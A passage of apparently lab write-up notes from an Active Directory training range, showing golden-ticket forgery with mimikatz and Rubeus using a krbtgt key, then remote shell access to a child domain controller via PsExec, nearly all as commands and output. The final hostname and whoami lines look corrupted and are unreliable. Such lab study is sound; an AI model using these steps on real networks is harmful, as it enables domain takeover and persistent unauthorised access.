- EA access grants us access to all the child domains.
- Forge a golden ticket as EA - using `mimikatz.exe`.
```
PS C:\AD\MyTools> .\mimikatz.exe "kerberos::golden /domain:moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /user:Administrator /ptt"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /domain:moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /user:Administrator /ptt
User      : Administrator
Domain    : moneycorp.local (MONEYCORP)
SID       : S-1-5-21-335606122-960912869-3279953914
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e - aes256_hmac
Lifetime  : 8/10/2023 9:50:21 AM ; 8/7/2033 9:50:21 AM ; 8/7/2033 9:50:21 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ moneycorp.local' successfully submitted for current session

mimikatz # exit
Bye!
PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ moneycorp.local
        Server: krbtgt/moneycorp.local @ moneycorp.local
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 8/10/2023 9:50:21 (local)
        End Time:   8/7/2033 9:50:21 (local)
        Renew Time: 8/7/2033 9:50:21 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\AD\MyTools> dir \\mcorp-dc.moneycorp.local\c$


    Directory: \\mcorp-dc.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        11/10/2022   9:53 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---         8/10/2023   2:38 AM                Users
d-----         8/10/2023   3:22 AM                Windows
```

- Forge a golden ticket as EA - using `Rubeus.exe`.
```
PS C:\AD\MyTools> .\Rubeus.exe golden /aes256:90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e /domain:moneycorp.local /dc:mcorp-dc.moneycorp.local /sid:S-1-5-21-335606122-960912869-3279953914 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : MONEYCORP.LOCAL (MONEYCORP)
[*] SID            : S-1-5-21-335606122-960912869-3279953914
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ServiceKey     : 90EC02CC0396DE7E08C7D5A163C21FD59FCB9F8163254F9775FC2604B9AEDB5E
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] KDCKey         : 90EC02CC0396DE7E08C7D5A163C21FD59FCB9F8163254F9775FC2604B9AEDB5E
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_SHA1_96_AES256
[*] Service        : krbtgt
[*] Target         : moneycorp.local

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@moneycorp.local'

[*] AuthTime       : 8/10/2023 10:03:01 AM
[*] StartTime      : 8/10/2023 10:03:01 AM
[*] EndTime        : 8/10/2023 8:03:01 PM
[*] RenewTill      : 8/17/2023 10:03:01 AM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
PS C:\AD\MyTools> klist

Current LogonId is 0:0x500f4dc

Cached Tickets: (1)

#0>     Client: Administrator @ MONEYCORP.LOCAL
        Server: krbtgt/moneycorp.local @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 8/10/2023 10:03:01 (local)
        End Time:   8/10/2023 20:03:01 (local)
        Renew Time: 8/17/2023 10:03:01 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

- Find the Domain Controller of `us.dollarcorp.moneycorp.local` domain.
```
PS C:\AD\MyTools> nslookup us.dollarcorp.moneycorp.local
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.2.1

Non-authoritative answer:
Name:    us.dollarcorp.moneycorp.local
Address:  172.16.9.1

PS C:\AD\MyTools> Get-DomainController -Domain us.dollarcorp.moneycorp.local


Forest                     : moneycorp.local
CurrentTime                : 8/10/2023 4:55:50 PM
HighestCommittedUsn        : 288354
OSVersion                  : Windows Server 2022 Standard
Roles                      : {PdcRole, RidRole, InfrastructureRole}
Domain                     : us.dollarcorp.moneycorp.local
IPAddress                  : 172.16.9.1
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {38e5d7cd-72fd-4b39-bcbf-9761d5a4c018, 5cc72b32-ff79-4bb0-8599-e8be4520eeb3}
OutboundConnections        : {29f15465-5ef6-4d0a-b600-87bf6f56a5a8, 83cb5211-27b5-41d1-afcf-6e9fbd30de06}
Name                       : us-dc.us.dollarcorp.moneycorp.local
Partitions                 : {CN=Configuration,DC=moneycorp,DC=local, CN=Schema,CN=Configuration,DC=moneycorp,DC=local, DC=ForestDnsZones,DC=moneycorp,DC=local, DC=us,DC=dollarcorp,DC=moneycorp,DC=local...}
```

- Confirm DA privileges.
```
PS C:\AD\MyTools> dir \\us-dc.us.dollarcorp.moneycorp.local\c$


    Directory: \\us-dc.us.dollarcorp.moneycorp.local\c$


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---        11/10/2022   9:53 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-r---        11/11/2022   5:29 AM                Users
d-----        11/11/2022  10:22 PM                Windows

PS C:\AD\MyTools> .\PsExec64.exe \\us-dc.us.dollarcorp.moneycorp.local powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com


Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> hostname
otaeus-dc
PS C:\Windows\system32>
PS C:\Windows\system32> whoami
haimoneycorp\administrator
```